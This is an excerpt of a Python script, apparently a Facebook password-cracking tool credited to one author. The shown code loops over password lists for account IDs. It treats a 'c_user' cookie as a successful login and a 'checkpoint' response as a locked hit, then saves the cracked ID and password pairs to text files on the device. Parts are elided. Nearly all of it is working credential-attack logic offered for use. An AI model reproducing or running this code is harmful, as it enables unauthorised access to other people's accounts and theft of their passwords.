...
\33[1;37m----------------------------------------------
→   Owner      :  Md. TAJUL ISLAM RABBI
→   Facebook   :  Md. TAJUL ISLAM RABBI
→   Github     :  Tajul-14
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/TAJUL.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[TAJUL-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/TAJUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[TAJUL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/TAJUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[TAJUL-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				open('TAJUL-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
